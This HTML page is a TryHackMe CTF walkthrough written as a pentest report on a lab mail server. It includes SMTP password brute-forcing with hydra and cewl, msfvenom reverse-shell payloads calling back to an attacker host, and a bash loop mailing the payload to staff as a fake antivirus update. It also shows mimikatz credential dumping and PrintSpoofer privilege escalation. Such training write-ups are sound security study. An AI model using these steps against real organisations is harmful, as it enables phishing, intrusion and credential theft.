<html>
  <head>
    <style>
      .Portal {
        border-color: lightblue;
        border-style: solid;
      }
    </style>
  </head>
  <body>
    <h1>
      You Got Mail | Try Hack Me | Pentest Style Report on a CTF
    </h1>
    <br/>
    <ul>
        <li></li>
        <li>Room: <a isRemReference="true" href="https://tryhackme.com/room/yougotmail?isPin=false">tryhackme.com/room/yougotmail</a></li>
        <li></li>
        <li><u><b>Objective:</b></u> </li>
        <li>To perform a security assessment for Brik and test the susceptibility of employees to phishing attacks.</li>
        <li></li>
        <li><u><b>Scope:</b></u> </li>
        <li>Active assessments on &lt;Machine_IP&gt; </li>
        <li>10.10.157.197</li>
        <li>Passive reconnaissance on <a isInlineLink="true" href="https://brownbrick.co/">brownbrick.co</a>.  </li>
        <li></li>
        <li><u><b>Reconnaisance:</b></u></li>
        <li>We start with Nmap scan. (For CTFs I always like to do all port scan first and then do a service version and scripts scan on the open ports.</li>
        <li>nmap -p- 10.10.157.197 -vvv
</li>
        <li></li>
        <li>There are a lot of ports open </li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/wuPc2TZj0ZwVT0-0-u7AD5GvzH_8N_XtmHh48Nasae7kgk-f1QRM9jDgQB_fNNed-IgXA_F7buGELUTHKoOjr1c5kNpWGyIP6THpEB3OiFbKOqZBpgvyTPOhkxgM8rFg.png" width="790" height="437.46250000000003"/></li>
        <li></li>
        <li>Now we enumerate the open ports with sVC for service version enumeration and default nmap scripts.</li>
        <li></li>
        <li>nmap -p 25,110,135,139,143,445,587,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49672 -sVC 10.10.157.197</li>
        <li></li>
        <li>nmap -p 25,110,135,139,143,445,587,3389,5985,47001,49664,49665,49666,49667,49668,49669,49671,49672 -sVC 10.10.157.197
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-11 05:38 UTC
Nmap scan report for ip-10-10-157-197.eu-west-1.compute.internal (10.10.157.197)
Host is up (0.00043s latency).

PORT      STATE  SERVICE       VERSION
25/tcp    open   smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open   pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open   imap          hMailServer imapd
|_imap-capabilities: CHILDREN RIGHTS=texkA0001 NAMESPACE IMAP4rev1 SORT completed CAPABILITY QUOTA OK IDLE IMAP4 ACL
445/tcp   open   microsoft-ds?
587/tcp   open   smtp          hMailServer smtpd
| smtp-commands: BRICK-MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-02-11T05:39:48+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=BRICK-MAIL
| Not valid before: 2025-02-10T05:10:02
|_Not valid after:  2025-08-12T05:10:02
| rdp-ntlm-info: 
|   Target_Name: BRICK-MAIL
|   NetBIOS_Domain_Name: BRICK-MAIL
|   NetBIOS_Computer_Name: BRICK-MAIL
|   DNS_Domain_Name: BRICK-MAIL
|   DNS_Computer_Name: BRICK-MAIL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-02-11T05:39:43+00:00
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49671/tcp open   msrpc         Microsoft Windows RPC
49672/tcp closed unknown
MAC Address: 02:19:9D:B1:01:83 (Unknown)
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: BRICK-MAIL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02199db10183 (unknown)
| smb2-time: 
|   date: 2025-02-11T05:39:43
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.53 seconds
</li>
        <li>The target system is running <b>Windows</b> &amp; has multiple email-related ports open, including <b>SMTP (25, 587), POP3 (110), and IMAP (143)</b>, indicating the presence of an <b>hMailServer</b> email service.  </li>
        <li></li>
        <li></li>
        <li><u><b>BrownBrick:</b></u></li>
        <li>Now lets enumerate the <a isInlineLink="true" href="https://brownbrick.co/">brownbrick.co</a> website to see what we can find.</li>
        <li>There is nothing much on the website, but &quot;Our Team&quot; page gives info of potential users &amp; their mail IDs.</li>
        <li><a isRemReference="true" href="https://brownbrick.co/menu.html?isPin=false">brownbrick.co/menu.html</a></li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/SEnT00bcgMwDBu3PE2LSvkkkPb3kayC0XEjNzmyL6cCzqKZzlX5-ZoIDgSnAa5Qbd3nbO_KYVnElp8PGnUsIdCWbCA35xDQK9rWrptsmoc0Zx3QX4Sly1bM8IwgaoZdg.png" width="790" height="362.4125"/></li>
        <li></li>
        <li>We make a list of the given email IDs:</li>
        <li>oaurelius@brownbrick.co
tchikondi@brownbrick.co
wrohit@brownbrick.co
pcathrine@brownbrick.co
lhedvig@brownbrick.co
fstamatis@brownbrick.co </li>
        <li></li>
        <li></li>
        <li>We have seen that SMTP has an hMailServer and we now have email IDs that potentially use that service. So lets try to brute force the password for all or any of the above mail IDs.</li>
        <li>hydra -L emails.txt -P /usr/share/wordlists/rockyou.txt 10.10.157.197 smtp</li>
        <li>There is potentially another easier way we can brute force by generating a wordlist from brownbricks.co using cewl</li>
        <li>cewl <a isInlineLink="true" href="https://brownbricks.co">https://brownbrick.co</a> &gt; pass.txt</li>
        <li>I also like to generate a lowercase file just in case, and then combine both lists for brute force</li>
        <li>cewl --lowercase https://brownbrick.co &gt; pass_lower.txt
</li>
        <li>And then combining both</li>
        <li>cat pass.txt pass_lower.tcxt &gt; passwords.txt</li>
        <li>hydra -L emails.txt -P passwords.txt 10.10.157.197 smtp</li>
        <li>And we have a password for one user</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/y4RBNJQO9E9Mcrnqjecw30zKlsRd6LKmuxEE96sMFFCdxX0wKHd3pFAMNoOvMLCiSFgBcl4LaaI6vx3bJ7BleMjTj0nlB1YaDM_b9UhLlQaqlheegGGktHFq_4uotULy.png" width="790" height="228.1125"/></li>
        <li>(rockyou.txt could&#39;ve also given us this password but it would&#39;ve taken alot of time.)</li>
        <li></li>
        <li><u><b>Phishing:</b></u></li>
        <li>As we have an email ID with its password for hMailServer, we can use thunderbird to login and send malicious mails to other users, or we can simply do that using a bash script. But first we need a payload that can give us reverse shell if any user clicks/installs it.</li>
        <li></li>
        <li>There are various ways to do this, like using a malicious VBA script in a .doc or .xls file or directly generating a reverse shell payload using msfvenom.  I would like to try .xls file here for this task just to simulate a realistic phishing attack.</li>
        <li></li>
        <li>First generate a reverse shell VBA script via msfveno </li>
        <li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.89.229 LPORT=443 -f vba</li>
        <li>Copy the generated script into the macro of a new &quot;sales_report.xls&quot; file.</li>
        <li>(Again, you don&#39;t need a meterpreter shell, you can use any windows reverse shell, you will use netcat to listen to in that case.)</li>
        <li></li>
        <li>If you went with meterpreter shell then start msfconsole and run multi/handler after setting the payload, LHOST and LPORT. If you used non-meterpreter payload then simple start a netcat listener.</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/nPODMLaX4g2-4syl_MAK7FjqwotQpCyMgcStKCfqOKLFaYw0Jh6Z8QTGg8d5tPEnA9cyPMkUakXf6qUkoRuCCJuUCGFNU0_BEuSEGmhim8scBZTwCep16lxL6WZ3U-Mr.png" width="790" height="247.8625"/></li>
        <li></li>
        <li>Now to send the mails, we can use bash script:</li>
        <li></li>
        <li>for email in $(cat emails.txt); do sendemail -f &quot;lhedvig@brownbrick.co&quot; -t $email -u &quot;Sales Report&quot; -m &quot;Please check the report is correct or needs to be updated.&quot; -a sales_report.xls -s 10.10.157.197:25 -xu &quot;lhedvig@brownbrick.co&quot; -xp &quot;bricks&quot;; done</li>
        <li>Explanation:</li>
        <li>for email in $(cat emails.txt); do ... done
</li>
        <li>Reads each email address from emails.txt and assigns it to the variable $email.
Iterates over each email and executes the sendemail command for it.</li>
        <li>sendemail
</li>
        <li>A command-line tool used to send emails via SMTP.</li>
        <li>-f &quot;lhedvig@brownbrick.co&quot;</li>
        <li>The sender&#39;s email address</li>
        <li>-t $email</li>
        <li>The recipient&#39;s email address (To field). This changes for each loop iteration.</li>
        <li>-u &quot;Sales Report&quot;</li>
        <li>Subject of mail</li>
        <li>-m &quot;Please check the report is correct or needs to be updated.&quot;</li>
        <li>Message inside mail</li>
        <li>-a sales_report.xls</li>
        <li>Our malicious attachment</li>
        <li>-s 10.10.157.197:25</li>
        <li>SMTP server</li>
        <li>-xu &quot;lhedvig@brownbrick.co&quot; -xp &quot;bricks&quot;;</li>
        <li>User ID and User  Password</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/BE-_RvjF8tpMQluhOjp4W4IonjH7kThWf7hlWWH32j8b1mWlFyb4fNIFCVGT72JiP8Zt4cR12cQFXEFMx-sxSHMgkmPyW6eHCrG4_U4jkvHj-icYhZnEd9RD2CrlI8Gg.png" width="790" height="155.0375"/></li>
        <li></li>
        <li>But I didn&#39;t get a shell, so it means VBA macro payload won&#39;t be executed as macros need to be activated, so we have to try a simpler direct payload.</li>
        <li>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.89.229 LPORT=443 -f exe -o update.exe</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/UStucY8E5NDLWQ6ryhKevo06pIR92rV8s-pp0AsVw4KZAxD9up--I5nkcVvQwYXQe-HCLHN6V3cg2chc-LoQWTKcTbJ2rcf9BABO6cGHu0TI6pTqzHS5xTR-FnBKlhPp.png" width="790" height="127.3875"/></li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/WTg9KazgxwdsHzks4J-VkFH8waQFQKRpI-4DMcpZlxAqqcY0m9vsRbktwAUUVmzU7MT3jZlIIxO-duJLEl2yWPTlDIY2xh7GjxRGQKNtlCkeBAO-w65eKstnvV8UMcK2.png" width="790" height="150.1"/></li>
        <li>for email in $(cat emails.txt); do sendemail -f &quot;lhedvig@brownbrick.co&quot; -t $email -u &quot;Sales Report&quot; -m &quot;Install the latest version of anti-virus to protect your system&quot; -a update.exe -s 10.10.157.197:25 -xu &quot;lhedvig@brownbrick.co&quot; -xp &quot;bricks&quot;; done</li>
        <li></li>
        <li>And we get a reverse shell as <b>wrohit</b> </li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/v5cOVyAoKSOUDlqT4vB9EPtavU9S792wC8aNoDWc-Lya_UZcf5Xhfzboh9DpYLGhuOtqDhiAvtnQbFV9Fp0pRRYq4I5PqyEY_Y3TPBMAWNXV7pCGO0_v8x8mqbcy7Wdq.png" width="790" height="191.57500000000002"/></li>
        <li></li>
        <li>Now get the user flag by navigating to the desktop</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/2VjgRU5OPIK6Tk8rrHwbwYN9ls0JtL2NSeOkqPWcW9BV4yDNUYklU9vMXdHAmulj9ORFcLhFJF0J1oL5a4EYcdSCFXLxbcxivg8CAZQpwJuy5qmF9Tyg80f9-RFEo2fY.png" width="790" height="216.26250000000002"/></li>
        <li></li>
        <li>Lets enumerate some things:</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/KHUKYcsWjN4NDsUiK9p2F7SlZSCBQiZqcwduRXlMYG9Fw5W9ISPwJZR23gkqQcQeb6I6P3tbvcyc8POUSuwOpozWsEY6_SR16LpUto7vFDIEtwHONgkj8CwvI5ej6-Cx.png" width="790" height="369.325"/></li>
        <li>So wrohit user is in administrators group, so we don&#39;t need to do a priv-esc (we will still do it at the end).</li>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
        <li>Now to answer the second question, we can use Mimikatz get the password.</li>
        <li>We already have meterpreter shell so we can just load the kiwi extension of mimikatz. If  we had a shell via netcat then we can simply upload mimikatz to the target and get the hash or even clear text password.</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/eyuBKyZ98Lpmo99VFvMtr0XpVfGd20vm4QuSlQJKix_w6zWqFxsNadTM8pQpe-T0iTQvaYZ1xW9KwlLw9XdQUpO8l8BltYrfX6Mv-9e2pjWNBJZ_wsqqiw3jESuRCc8p.png" width="790" height="188.6125"/></li>
        <li>But this needed system privileges so kiwi didn&#39;t give any results, so I uploaded mimikatz to the target.</li>
        <li></li>
        <li>sekurlsa::wdigest</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/Koxy0V5cY5IXx4pc2WxTnguStTb2_r8b8uRdYOS190MlrxQqvtczjhJUAXG1YDvqnOVKQ58bWv_KyjNMp9Ji4UHmjAdcETvW6WDF5KjGKeg49eZM0G8IpsBaTM23hZjh.png" width="781" height="588"/></li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/of-w-PiWODRp32DPgDkgVfFKjA212WS42tK7zomeS0EpeBFsar0Hb1_BKp9KoacRs0eTN_DsZ30qQHTB4EaqoHL0kClvf4jg5N2eWO-aXY4BTQKU9rxF_LErMZTQh2a4.png" width="684" height="239"/></li>
        <li>We get wrohit&#39;s password.</li>
        <li></li>
        <li></li>
        <li>Now to answer the final question we have to navigate to</li>
        <li>C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini</li>
        <li>As this is the file where hMailServer stores the credentials</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/xpbWu0p6NxLsXtRSNpIbNcF6dkbtjGfszQ4474KKTQOlEtHLjLsn7vbQslglAH3Ke8_8o0wz13PPqUnEFva-8SB-1iNcRDIxkanF6Dmk5HpalcmXMKrsP1vb7kghwDH8.png" width="790" height="172.8125"/></li>
        <li>(the official hMailServer website also shares this info but for some reason the website wasn&#39;t loading so I had to go to chatgpt)</li>
        <li>By opening the hMailServer.INI file</li>
        <li>type hMailServer.INI</li>
        <li>We get the password hash.</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/zJMFe8cQJFz1AefxHDTyrYmVLh213eLdlByvuhdy4m1iGMYZ4keQGFmKXkvFkqEVFBEwTueJKUzB1Xx6dWtP5HfytReRuONeJXQCuGVgmdFVOU2NurAJwGA9zcJUHVLN.png" width="790" height="454.96863237139274"/></li>
        <li></li>
        <li>To crack the password we can simply use crackstation (as this is a CTF and not a real target)</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/hbectJPQQpPnlL-HLoKLHIUxXXEf6Wbw-H1rmKyHH4IUr_rPf9g6iq0-1jTf5Fa0e1Wt7hWsSpwcn7nd7k2KlAcXLyE7j4hePRaJaE_yy1iCNFAfrP6KTQoUg03syTf2.png" width="790" height="319.95"/></li>
        <li></li>
        <li></li>
        <li>We get the password and the room is complete!</li>
        <li></li>
        <li></li>
        <li>Although not required for this room, I still try to escalate our privileges. </li>
        <li>By checking &quot;whoami /priv&quot; we see we have &quot;SeImpersonatePrivilege&quot;</li>
        <li><u><b>Priv-esc:</b></u> </li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/o_ndg4E0OKbsM8HVYEU4uUPhBFnsAutNF6ySRfGURIaFHwQe8YCaeXHwUl62Jpg_gxgVO1J2jzKxLcu9q48igmCMCqHymZmSRMjh125uA6M1EeeU7k-xaFS52vySCDHp.png" width="790" height="411.7875"/></li>
        <li></li>
        <li>We can use PrintSpoofer <a isRemReference="true" href="https://github.com/itm4n/PrintSpoofer?isPin=false">GitHub - itm4n/PrintSpoofer: Abusing impersonation privileges through the &quot;Printer Bug&quot;</a> to priv-esc to Administrator.</li>
        <li>We just have to upload it to the target and run</li>
        <li><img src="https://remnote-user-data.s3.amazonaws.com/QAvgG_lESBhqmPEAwtNDFNkDI4oyQdIfISpzaJKrgkpMjXAjkzYIXqyAnFzNyVbRyNhcIXVv9hh6yZStUss-rWRj0pVdI-GsX_xU7QvjgwJqf3NuyvF-jysYim8pLxGa.png" width="790" height="431.5375"/></li>
        <li></li>
        <li>And we have the highest privileges of a Windows system &quot;<b>nt authority\system</b>&quot;.</li>
        <li></li>
        <li>Thank you for reading :)</li>
        <li></li>
        <li>My linkedin: <a isInlineLink="true" href="https://www.linkedin.com/in/imshadab18">https://www.linkedin.com/in/imshadab18</a>
  </li>
        <li></li>
        <li></li>

    </ul>
    </body>
</html>
